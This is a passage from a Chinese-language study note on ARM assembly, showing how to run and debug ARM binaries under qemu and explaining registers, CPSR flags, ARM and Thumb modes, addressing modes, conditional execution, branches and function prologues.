title="运行"></a>运行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> qemu-arm -L /usr/arm-linux-gnueabihf ./bin</span></span><br></pre></td></tr></table></figure><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> qemu-arm -g 1234 -L /usr/arm-linux-gnueabihf ./bin</span></span><br></pre></td></tr></table></figure><p>gdb-multiarch</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gdb-multiarch</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> arch arm</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> target remote :1234</span></span><br></pre></td></tr></table></figure><h3 id="安装binutils"><a href="#安装binutils" class="headerlink" title="安装binutils"></a>安装binutils</h3><p>如果不安装，pwntools某些功能会报错。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-cache search &quot;binutils&quot; | grep arm</span><br></pre></td></tr></table></figure><h2 id="ARM汇编"><a href="#ARM汇编" class="headerlink" title="ARM汇编"></a>ARM汇编</h2><p>不像X86，ARM是精简指令集，在寄存器上执行所有的运算，使用Load/Store指令访存。这意味着将内存中的某个32bit的值加一需要三种类型的指令（Load，Increment，Store）。</p><p>ARM有两种模式，ARM模式和Thumb模式。Thumb指令可以是2字节或4字节。</p><p>与X86的不同之处：</p><ul><li>在ARM上大多数指令可以用来条件执行</li><li>X86是小端存储</li><li>ARM在version 3之前也是小端，后面变成大端存储，并且提供了在大端和小端之间转换的功能。</li></ul><p>在ARM各个版本中也存在不同之处，该教程[4]以最通用的方式来教学，讲解32bit ARM汇编，示例面向32bit ARM v6。ARM命名：</p><table><thead><tr><th>ARM family</th><th>ARM architecture</th></tr></thead><tbody><tr><td>ARM7</td><td>ARM v4</td></tr><tr><td>ARM9</td><td>ARM v5</td></tr><tr><td>ARM11</td><td>ARM V6</td></tr><tr><td>Cortex-A</td><td>ARM V7-A</td></tr><tr><td>Cortex-R</td><td>ARM V7-R</td></tr><tr><td>Cortex-M</td><td>ARM V7-M</td></tr></tbody></table><h3 id="ARM数据类型与寄存器"><a href="#ARM数据类型与寄存器" class="headerlink" title="ARM数据类型与寄存器"></a>ARM数据类型与寄存器</h3><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>对于32bit ARM有带符号和不带符号的“字，半字，字节”这三种尺寸，对于”半字“由<code>-h</code>或<code>-sh</code>表示，对于”字节“由<code>-b</code>和<code>-sb</code>表示，字没有符号表示，默认就是”字“。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ldr &#x3D; Load Word</span><br><span class="line">ldrh &#x3D; Load unsigned Half Word</span><br><span class="line">ldrsh &#x3D; Load signed Half Word</span><br><span class="line">ldrb &#x3D; Load unsigned Byte</span><br><span class="line">ldrsb &#x3D; Load signed Bytes</span><br><span class="line"></span><br><span class="line">str &#x3D; Store Word</span><br><span class="line">strh &#x3D; Store unsigned Half Word</span><br><span class="line">strsh &#x3D; Store signed Half Word</span><br><span class="line">strb &#x3D; Store unsigned Byte</span><br><span class="line">strsb &#x3D; Store signed Byte</span><br></pre></td></tr></table></figure><h4 id="大小端"><a href="#大小端" class="headerlink" title="大小端"></a>大小端</h4><p>指令固定小端存储（？存疑），数据访问大小端都可以，大小端由CPSR(Current Program Status Register)寄存器的bit9控制。</p><h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><p>由16个用户可用的寄存器，其他寄存器需要特权模式使用。这16寄存器可以分成两组，通用寄存器和特殊用途寄存器。</p><table><thead><tr><th>#</th><th>Alias</th><th>Purpose</th></tr></thead><tbody><tr><td>R0</td><td>-</td><td>General purpose</td></tr><tr><td>R1</td><td>-</td><td>General purpose</td></tr><tr><td>R2</td><td>-</td><td>General purpose</td></tr><tr><td>R3</td><td>-</td><td>General purpose</td></tr><tr><td>R4</td><td>-</td><td>General purpose</td></tr><tr><td>R5</td><td>-</td><td>General purpose</td></tr><tr><td>R6</td><td>-</td><td>General purpose</td></tr><tr><td>R7</td><td>-</td><td>Holds Syscall Number</td></tr><tr><td>R8</td><td>-</td><td>General purpose</td></tr><tr><td>R9</td><td>-</td><td>General purpose</td></tr><tr><td>R10</td><td>-</td><td>General purpose</td></tr><tr><td>R11</td><td>FP</td><td>Frame Pointer</td></tr><tr><td><strong>Special</strong></td><td><strong>Purpose</strong></td><td><strong>Registers</strong></td></tr><tr><td>R12</td><td>IP</td><td>Intra Procedural Call</td></tr><tr><td>R13</td><td>SP</td><td>Stack Pointer</td></tr><tr><td>R14</td><td>LR</td><td>Link Register</td></tr><tr><td>R15</td><td>PC</td><td>Program Counter</td></tr><tr><td>CPSR</td><td>-</td><td>Current Program Status Registers</td></tr></tbody></table><p>R0-R12：用来存储临时数据，指针等。例如：R0当作累加器在算数运算期间，也可以存储函数返回值。R7在系统调用时用来存储系统调用号。R11用来跟踪栈帧的边界。R0-R3存储调用的前四个参数。</p><p>R13：SP指向栈顶，函数返回时恢复。</p><p>R14：LR指向函数调用处的下一条指令，类似储存函数返回地址。</p><p>R15：PC自加，ARM模式每次+4，THUMB模式每次+2（？存疑），在执行期间PC存储当前指令地址+8的地方（为了兼容老型号，老型号会预取2条指令），THUMB则是+4.</p><h4 id="CPSR"><a href="#CPSR" class="headerlink" title="CPSR"></a>CPSR</h4><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img20201010001303.png"></p><p>左侧是最高有效位，右侧是最低有效位。</p><table><thead><tr><th align="left">Flag</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">N (Negative)</td><td align="left">使能当指令产生负数</td></tr><tr><td align="left">Z (Zero)</td><td align="left">使能当指令产生0</td></tr><tr><td align="left">C (Carry)</td><td align="left">使能如果指令产生的结果需要33bit</td></tr><tr><td align="left">V (Overflow)</td><td align="left">使能如果指令产生的结果32bit不够用</td></tr><tr><td align="left">E (Endian-bit)</td><td align="left">标识大小端，0小端1大端</td></tr><tr><td align="left">T (Thumb-bit)</td><td align="left">标识ARM或THUMB模式</td></tr><tr><td align="left">M (Mode-bits)</td><td align="left">标识特权级别(USR, SVC, etc.).</td></tr><tr><td align="left">J (Jazelle)</td><td align="left">允许ARM硬件执行java字节码</td></tr></tbody></table><p>N：在结果是有符号的二进制补码情况下，如果结果为负数，则N=1；如果结果为非负数，则N=0。</p><p>Z：如果结果为0，则Z=1;如果结果为非零，则Z=0。</p><p>C：其设置分一下几种情况：</p><p>对于加法指令（包含比较指令CMN），如果产生进位，则C=1;否则C=0。</p><p>对于减法指令（包括比较指令CMP），如果产生借位，则C=0;否则C=1。</p><p>对于有移位操作的非法指令，C为移位操作中最后移出位的值。</p><p>对于其他指令，C通常不变。</p><p>V：对于加减法指令，在操作数和结果是有符号的整数时，如果发生溢出，则V=1;如果无溢出发生，则V=0;对于其他指令，V通常不发生变化。</p><p>假设现在用 <code>cmp</code> 指令来比较 <code>1</code> 和 <code>2</code> ，<code>cmp</code> 会进行减法运算 <code>1 - 2 = -1</code> 结果为负数，这时这个运算结果就会影响到 <code>CPSR</code> 的 <code>N</code> 标志位，因为 <code>cmp</code> 的运算结果是负数所以会把 <code>N</code> 置为 <code>1</code>，如果是比较 <code>2</code> 和 <code>2</code> 运算结果是 <code>0</code> 这会置位 <code>Z</code> 标志位，但是要注意一点是 <code>cmp</code> 的执行结果不会影响它使用的寄存器只会 <strong>隐式</strong> 地影响 <code>CPSR</code> 寄存器的值。</p><h4 id="APSR"><a href="#APSR" class="headerlink" title="APSR"></a>APSR</h4><p>包含<code>N</code>, <code>Z</code>, <code>C</code>, <code>V</code>这几个运算标志位。</p><p><code>C</code>出现的条件：</p><ol><li>加法运算结果大于等于2^32</li><li>减法运算结果是正数或0</li><li>桶式移位的结果，在move或者逻辑指令</li></ol><h3 id="ARM指令集"><a href="#ARM指令集" class="headerlink" title="ARM指令集"></a>ARM指令集</h3><h4 id="ARM-和-THUMB"><a href="#ARM-和-THUMB" class="headerlink" title="ARM 和 THUMB"></a>ARM 和 THUMB</h4><p>ARM和THUMB主要是指令集方面的不同，ARM指令是32bit的，THUMB指令是16bit(可以是32bit)，编写shellcode需要避免null byte，使用THUMB可以减少null byte的概率。</p><p>THUMB指令集不同版本之间差异较大，不必细究，具体版本具体查阅<a href="http://infocenter.arm.com/help/index.jsp">infocenter</a>就可以。</p><p>THUMB版本：Thumb-1，Thumb-2，ThumbEE。不同名称只为区分指令集，处理器总是称之为Thumb。</p><p><strong>ARM和Thumb的不同：</strong></p><ul><li>条件执行，所有的ARM指令都支持条件执行，Thumb不支持（一些版本使用<code>IT</code>指令支持）。</li><li>32bit的ARM和Thumb指令，Thumb指令有<code>.w</code>后缀。</li><li>桶式移位是ARM模式的一个特征，将多条指令合为一条。</li></ul><p>切换模式：使用<code>BX</code>或者<code>BLX</code>指令，并且设置目标地址+1，不必担心对齐。可以通过CPSR寄存器知晓目前的模式。</p><h4 id="ARM汇编简介"><a href="#ARM汇编简介" class="headerlink" title="ARM汇编简介"></a>ARM汇编简介</h4><p>指令模板：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MNEMONIC&#123;S&#125;&#123;condition&#125; &#123;Rd&#125;, Operand1, Operand2</span><br></pre></td></tr></table></figure><ul><li>MNEMONIC 指令名称</li><li>{S} 可选项。如果给出，就将会根据结果更新条件flag</li><li>{condition} 执行该条命令所需要满足的条件。</li><li>{Rd} 目标寄存器，存储指令的结果。</li><li>Operand1 参数一，可以是寄存器或者立即数</li><li>Operand2 参数二，可以是立即数或者寄存器（寄存器可以进行可选的移位）</li></ul><p>参数二的概念有些复杂，给出参数二的几个示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#123                    - 立即数</span><br><span class="line">Rx                      - 寄存器X</span><br><span class="line">Rx, ASR n               - 寄存器X算数右移n位 (1 &#x3D; n &#x3D; 32)</span><br><span class="line">Rx, LSL n               - 寄存器X逻辑左移n位 (0 &#x3D; n &#x3D; 31)</span><br><span class="line">Rx, LSR n               - 寄存器X逻辑左移n位 n bits (1 &#x3D; n &#x3D; 32)</span><br><span class="line">Rx, ROR n               - 寄存器X循环右移n位 (1 &#x3D; n &#x3D; 31)</span><br><span class="line">Rx, RRX                 - 寄存器X循环右移1位, with extend？</span><br></pre></td></tr></table></figure><p>指令示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ADD   R0, R1, R2         - R0 &#x3D; R1 + R2</span><br><span class="line">ADD   R0, R1, #2         - R0 &#x3D; R1 + 2</span><br><span class="line">MOVLE R0, #5             - 当作MOVLE R0, R0, #5; if less or equal: R0 &#x3D; 5</span><br><span class="line">MOV   R0, R1, LSL #1     - R0 &#x3D; R1 &lt;&lt; 1</span><br></pre></td></tr></table></figure><p>常见指令</p><table><thead><tr><th align="center">Instruction</th><th align="left">Description</th><th align="center">Instruction</th><th align="left">Description</th></tr></thead><tbody><tr><td align="center">MOV</td><td align="left">Move data</td><td align="center">EOR</td><td align="left">Bitwise XOR</td></tr><tr><td align="center">MVN</td><td align="left">Move and negate</td><td align="center">LDR</td><td align="left">Load</td></tr><tr><td align="center">ADD</td><td align="left">Addition</td><td align="center">STR</td><td align="left">Store</td></tr><tr><td align="center">SUB</td><td align="left">Subtraction</td><td align="center">LDM</td><td align="left">Load Multiple</td></tr><tr><td align="center">MUL</td><td align="left">Multiplication</td><td align="center">STM</td><td align="left">Store Multiple</td></tr><tr><td align="center">LSL</td><td align="left">Logical Shift Left</td><td align="center">PUSH</td><td align="left">Push on Stack</td></tr><tr><td align="center">LSR</td><td align="left">Logical Shift Right</td><td align="center">POP</td><td align="left">Pop off Stack</td></tr><tr><td align="center">ASR</td><td align="left">Arithmetic Shift Right</td><td align="center">B</td><td align="left">Branch</td></tr><tr><td align="center">ROR</td><td align="left">Rotate Right</td><td align="center">BL</td><td align="left">Branch with Link</td></tr><tr><td align="center">CMP</td><td align="left">Compare</td><td align="center">BX</td><td align="left">Branch and eXchange</td></tr><tr><td align="center">AND</td><td align="left">Bitwise AND</td><td align="center">BLX</td><td align="left">Branch with Link and eXchange</td></tr><tr><td align="center">ORR</td><td align="left">Bitwise OR</td><td align="center">SWI/SVC</td><td align="left">System Call</td></tr></tbody></table><h3 id="数据存储LOAD-STORE"><a href="#数据存储LOAD-STORE" class="headerlink" title="数据存储LOAD STORE"></a>数据存储LOAD STORE</h3><h4 id="基础示例"><a href="#基础示例" class="headerlink" title="基础示例"></a>基础示例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDR R2, [R0]   将R0所存地址处的数据加载到R2</span><br><span class="line">STR R2, [R1]   将R2存储到R1所指示的地址处</span><br></pre></td></tr></table></figure><p>PC相对寻址。将const数据存储在代码段。注意实际PC预取两条指令。</p><p><img src="https://azeria-labs.com/wp-content/uploads/2017/04/pc-relative1-1.png.pagespeed.ce.hWNi5fEpQV.png" alt="relative addressing"></p><h4 id="立即数偏移寻址"><a href="#立即数偏移寻址" class="headerlink" title="立即数偏移寻址"></a>立即数偏移寻址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str r2, [r1, #2]  @ address mode: offset. 将R2数据存储到R1+2地址处</span><br><span class="line">str r2, [r1, #4]! @ address mode: pre-indexed. 将R2数据存储到R1+4地址处，R1&#x3D;R1+4</span><br><span class="line">ldr r3, [r1], #4  @ address mode: post-indexed. 将R1地址处的数据读取到R3，R1&#x3D;R1+4</span><br></pre></td></tr></table></figure><h4 id="寄存器偏移寻址"><a href="#寄存器偏移寻址" class="headerlink" title="寄存器偏移寻址"></a>寄存器偏移寻址</h4><p>和上面一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str r2, [r1, r2]  @ address mode: offset.  </span><br><span class="line">str r2, [r1, r2]! @ address mode: pre-indexed.</span><br><span class="line">ldr r3, [r1], r2  @ address mode: post-indexed.</span><br></pre></td></tr></table></figure><h4 id="scaled寄存器偏移寻址"><a href="#scaled寄存器偏移寻址" class="headerlink" title="scaled寄存器偏移寻址"></a>scaled寄存器偏移寻址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str r2, [r1, r2, LSL#2]  @ address mode: offset. R1+R2&lt;&lt;2</span><br><span class="line">str r2, [r1, r2, LSL#2]! @ address mode: pre-indexed. R1 &#x3D; R1 + R2&lt;&lt;2</span><br><span class="line">ldr r3, [r1], r2, LSL#2  @ address mode: post-indexed. R1 &#x3D; R1 + R2&lt;&lt;2</span><br></pre></td></tr></table></figure><h4 id="PC偏移"><a href="#PC偏移" class="headerlink" title="PC偏移"></a>PC偏移</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">   ldr r0, &#x3D;jump        &#x2F;* load the address of the function label jump into R0 *&#x2F;</span><br><span class="line">   ldr r1, &#x3D;0x68DB00AD  &#x2F;* load the value 0x68DB00AD into R1 *&#x2F;</span><br><span class="line">jump:</span><br><span class="line">   ldr r2, &#x3D;511         &#x2F;* load the value 511 into R2 *&#x2F; </span><br><span class="line">   bkpt</span><br></pre></td></tr></table></figure><p>伪指令，一条指令转移32 bit数据。实际上ARM一条指令只能加载8bit数据。</p><h4 id="立即数"><a href="#立即数" class="headerlink" title="立即数"></a>立即数</h4><p>因为ARM指令都是固定的32bit，所以去除condition code，opcode等等，就只剩了12bit给立即数用。也不是直接用12bit存储4096个数字。而是4bit作为循环右移的次数(r)，8bit作为数字(n)，最终立即数的value = n ror (r*2)。可以看到所能表示的数字局限性很大，只能表示8bit数字循环右移偶数次的数字，且右移次数在[0, 30]之间。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Valid values:</span><br><span class="line">#256        &#x2F;&#x2F; 1 ror 24 --&gt; 256</span><br><span class="line">#384        &#x2F;&#x2F; 6 ror 26 --&gt; 384</span><br><span class="line">#484        &#x2F;&#x2F; 121 ror 30 --&gt; 484</span><br><span class="line">#16384      &#x2F;&#x2F; 1 ror 18 --&gt; 16384</span><br><span class="line">#2030043136 &#x2F;&#x2F; 121 ror 8 --&gt; 2030043136</span><br><span class="line">#0x06000000 &#x2F;&#x2F; 6 ror 8 --&gt; 100663296 (0x06000000 in hex)</span><br><span class="line"></span><br><span class="line">Invalid values:</span><br><span class="line">#370        &#x2F;&#x2F; 185 ror 31 --&gt; 31 is not in range (0 – 30)</span><br><span class="line">#511        &#x2F;&#x2F; 1 1111 1111 --&gt; bit-pattern can’t fit into one byte</span><br><span class="line">#0x06010000 &#x2F;&#x2F; 1 1000 0001.. --&gt; bit-pattern can’t fit into one byte</span><br></pre></td></tr></table></figure><p><strong>避免方法</strong></p><ol><li>使用小数字构建大数字，如：不使用<code>MOV  r0, #511</code>，而是使用<code>MOV r0, #256, and ADD r0, #255</code></li><li>使用<code>LDR r1, =511</code>，让编译器替你转换成mov指令或者PC偏移加载。</li></ol><h3 id="LOAD-STORE-多个"><a href="#LOAD-STORE-多个" class="headerlink" title="LOAD STORE 多个"></a>LOAD STORE 多个</h3><p><code>LDM</code>, <code>STM</code>，有后缀<code>-IA</code>（Increase After）, <code>IB</code>（Increase Before）, <code>DA</code>（Decrease After）, <code>DB</code>（Decrease Before）。</p><p><code>LDM</code> 相当于 <code>LDMIA</code></p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ldm r0, &#123;r4,r5&#125;    &#x2F;* 分别读取R0，R0+4地址处的数据到R4，R5 *&#x2F;</span><br><span class="line">stm r0, &#123;r4,r5&#125;    &#x2F;* 将R4，R5存储到R0，R0+4地址处</span><br><span class="line">ldmib r0, &#123;r4-r6&#125;  &#x2F;* 分别读取R0+4, R0+8, R0+12地址处的数据到R4, R5, R6 *&#x2F;</span><br><span class="line">stmib r1, &#123;r4-r6&#125;  &#x2F;* 同理 *&#x2F;</span><br><span class="line">ldmda r0, &#123;r4-r6&#125;  &#x2F;* 分别读取R0-8, R0-4, R0地址处的数据到R4, R5, R6。数字大的寄存器对应高地址数据*&#x2F;</span><br><span class="line">ldmdb r0, &#123;r4-r6&#125;  &#x2F;* 同理 *&#x2F;</span><br><span class="line">stmda r2, &#123;r4-r6&#125;  &#x2F;* 将R4, R5, R6分别存储到R2-8, R2-4, R2地址处</span><br></pre></td></tr></table></figure><h4 id="push-pop"><a href="#push-pop" class="headerlink" title="push pop"></a>push pop</h4><p><code>push</code>：sp-4, store</p><p><code>pop</code>：load，sp+4</p><p><code>push &#123;r0,r1&#125;</code>相当于<code>stmdb sp!, &#123;r0,r1&#125;</code></p><p><code>pop &#123;r2, r3&#125;</code>相当于<code>ldria sp!, &#123;r2,r3&#125;</code></p><h3 id="条件执行与分支"><a href="#条件执行与分支" class="headerlink" title="条件执行与分支"></a>条件执行与分支</h3><h4 id="条件执行"><a href="#条件执行" class="headerlink" title="条件执行"></a>条件执行</h4><table><thead><tr><th align="center">Condition Code</th><th align="left">Meaning (for cmp or subs)</th><th align="center">Status of Flags</th></tr></thead><tbody><tr><td align="center">EQ</td><td align="left">Equal</td><td align="center">Z==1</td></tr><tr><td align="center">NE</td><td align="left">Not Equal</td><td align="center">Z==0</td></tr><tr><td align="center">GT</td><td align="left">Signed Greater Than</td><td align="center">(Z==0) &amp;&amp; (N==V)</td></tr><tr><td align="center">LT</td><td align="left">Signed Less Than</td><td align="center">N!=V</td></tr><tr><td align="center">GE</td><td align="left">Signed Greater Than or Equal</td><td align="center">N==V</td></tr><tr><td align="center">LE</td><td align="left">Signed Less Than or Equal</td><td align="center">(Z==1) || (N!=V)</td></tr><tr><td align="center">CS or HS</td><td align="left">Unsigned Higher or Same (or Carry Set)</td><td align="center">C==1</td></tr><tr><td align="center">CC or LO</td><td align="left">Unsigned Lower (or Carry Clear)</td><td align="center">C==0</td></tr><tr><td align="center">MI</td><td align="left">Negative (or Minus)</td><td align="center">N==1</td></tr><tr><td align="center">PL</td><td align="left">Positive (or Plus)</td><td align="center">N==0</td></tr><tr><td align="center">AL</td><td align="left">Always executed</td><td align="center">–</td></tr><tr><td align="center">NV</td><td align="left">Never executed</td><td align="center">–</td></tr><tr><td align="center">VS</td><td align="left">Signed Overflow</td><td align="center">V==1</td></tr><tr><td align="center">VC</td><td align="left">No signed Overflow</td><td align="center">V==0</td></tr><tr><td align="center">HI</td><td align="left">Unsigned Higher</td><td align="center">(C==1) &amp;&amp; (Z==0)</td></tr><tr><td align="center">LS</td><td align="left">Unsigned Lower or same</td><td align="center">(C==0) || (Z==0)</td></tr></tbody></table><h4 id="Thumb中的条件执行"><a href="#Thumb中的条件执行" class="headerlink" title="Thumb中的条件执行"></a>Thumb中的条件执行</h4><p>Thumb-2有条件执行指令<code>IT</code>，其最多允许4条指令。</p><ul><li>IT refers to If-Then (next instruction is conditional)</li><li>ITT refers to If-Then-Then (next 2 instructions are conditional)</li><li>ITE refers to If-Then-Else (next 2 instructions are conditional)</li><li>ITTE refers to If-Then-Then-Else (next 3 instructions are conditional)</li><li>ITTEE refers to If-Then-Then-Else-Else (next 4 instructions are conditional)</li></ul><p>其实就是if–else语句，else的逻辑必须与if<strong>相反</strong>。if成立执行一条或两条指令，else成立就执行else一条或两条指令。示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ITTE   NE           ; Next 3 instructions are conditional</span><br><span class="line">ANDNE  R0, R0, R1   ; ANDNE does not update condition flags</span><br><span class="line">ADDSNE R2, R2, #1   ; ADDSNE updates condition flags</span><br><span class="line">MOVEQ  R2, R3       ; Conditional move</span><br><span class="line"></span><br><span class="line">ITE    GT           ; Next 2 instructions are conditional</span><br><span class="line">ADDGT  R1, R0, #55  ; Conditional addition in case the GT is true</span><br><span class="line">ADDLE  R1, R0, #48  ; Conditional addition in case the GT is not true</span><br><span class="line"></span><br><span class="line">ITTEE  EQ           ; Next 4 instructions are conditional</span><br><span class="line">MOVEQ  R0, R1       ; Conditional MOV</span><br><span class="line">ADDEQ  R2, R2, #10  ; Conditional ADD</span><br><span class="line">ANDNE  R3, R3, #1   ; Conditional AND</span><br><span class="line">BNE.W  dloop        ; Branch instruction can only be used in the last instruction of an IT block</span><br></pre></td></tr></table></figure><p>相反的条件：</p><table><thead><tr><th align="center">Condition Code</th><th align="center">Opposite</th><th align="center"></th><th align="center"></th></tr></thead><tbody><tr><td align="center">Code</td><td align="center">Meaning</td><td align="center">Code</td><td align="center">Meaning</td></tr><tr><td align="center">EQ</td><td align="center">Equal</td><td align="center">NE</td><td align="center">Not Equal</td></tr><tr><td align="center">HS (or CS)</td><td align="center">Unsigned higher or same (or carry set)</td><td align="center">LO (or CC)</td><td align="center">Unsigned lower (or carry clear)</td></tr><tr><td align="center">MI</td><td align="center">Negative</td><td align="center">PL</td><td align="center">Positive or Zero</td></tr><tr><td align="center">VS</td><td align="center">Signed Overflow</td><td align="center">VC</td><td align="center">No Signed Overflow</td></tr><tr><td align="center">HI</td><td align="center">Unsigned Higher</td><td align="center">LS</td><td align="center">Unsigned Lower or Same</td></tr><tr><td align="center">GE</td><td align="center">Signed Greater Than or Equal</td><td align="center">LT</td><td align="center">Signed Less Than</td></tr><tr><td align="center">GT</td><td align="center">Signed Greater Than</td><td align="center">LE</td><td align="center">Signed Less Than or Equal</td></tr><tr><td align="center">AL (or omitted)</td><td align="center">Always Executed</td><td align="center">There is no opposite to AL</td><td align="center"></td></tr></tbody></table><h4 id="B-BL-BX-BLX"><a href="#B-BL-BX-BLX" class="headerlink" title="B/BL/BX/BLX"></a>B/BL/BX/BLX</h4><p>L: link</p><p>X: Exchange</p><ul><li>B，就是普通的跳转</li><li>BL，跳转并且把PC+4存储到LR寄存器。（实际调试发现，这里的PC不是+8之后的，存储的返回地址</li><li>BX，BLX，<code>X</code>就是转换ARM/THUMB模式的意思</li></ul><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">     .code 32         @ ARM mode</span><br><span class="line">     add r2, pc, #1   @ put PC+1 into R2，此时实际PC指向mov r0,r1指令开始处（PC+8），所以bx可以直接跳过去</span><br><span class="line">     bx r2            @ branch + exchange to R2</span><br><span class="line"></span><br><span class="line">    .code 16          @ Thumb mode</span><br><span class="line">     mov r0, #1</span><br></pre></td></tr></table></figure><h4 id="条件分支"><a href="#条件分支" class="headerlink" title="条件分支"></a>条件分支</h4><p>给分支加上条件，如：<code>BEQ</code></p><h3 id="栈和函数"><a href="#栈和函数" class="headerlink" title="栈和函数"></a>栈和函数</h3><h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p>栈的类型：full ascending, full descending, empty ascending, empty descending</p><p>full/empty：sp指向是否有数据</p><p>ascending/descending：栈长的方向</p><p>ARM是full descending</p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p><strong>prologue</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push   &#123;r11, lr&#125;    &#x2F;* Start of the prologue. Saving Frame Pointer and LR onto the stack *&#x2F;</span><br><span class="line">add    r11, sp, #0  &#x2F;* Setting up the bottom of the stack frame *&#x2F;</span><br><span class="line">sub    sp, sp, #16  &#x2F;* End of the prologue. Allocating some buffer on the stack. This also allocates space for the Stack Frame *&#x2F;</span><br></pre></td></tr></table></figure><p>保存前一个R11和程序返回地址。（BL指令，跳转向指定地址，并将返回地址存储于lr，由被调用者保存lr）</p><p>保存栈帧</p><p>创建函数所需栈空间</p><p><strong>body</strong></p><p>函数逻辑</p><p><strong>epilogue</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub    sp, r11, #0  &#x2F;* Start of the epilogue. Readjusting the Stack Pointer *&#x2F;</span><br><span class="line">pop    &#123;r11, pc&#125;    &#x2F;* End of the epilogue. Restoring Frame Pointer from the Stack, jumping to previously saved LR via direct load into PC. The Stack Frame of a function is finally destroyed at this step. *&#x2F;</span><br></pre></td></tr></table></figure><p>恢复SP，取出r11和返回地址。</p><h4 id="叶子函数与非叶子函数"><a href="#叶子函数与非叶子函数" class="headerlink" title="叶子函数与非叶子函数"></a>叶子函数与非叶子函数</h4><p>叶子函数：函数中不会再调用其他函数</p><p>非叶子函数：相反。</p><p>叶子函数因为不会再调用，LR寄存器不会再改变，所以不必保存LR寄存器。叶子函数的最后使用<code>bx lr</code>跳转回去就可以。</p><p><code>bx</code>在地址最低位设置为1的情况下才会进行ARM/THUMB模式的转换，否则不会改变只是跳转。</p><h3 id="aarch64"><a href="#aarch64" class="headerlink" title="aarch64"></a>aarch64</h3><p>AArch拥有31个通用寄存器，系统运行在64位状态下的时候名字叫Xn，运行在32位的时候就叫Wn。</p><table><thead><tr><th align="center">寄存器</th><th align="center">别名</th><th align="center">意义</th></tr></thead><tbody><tr><td align="center">SP</td><td align="center">–</td><td align="center">Stack 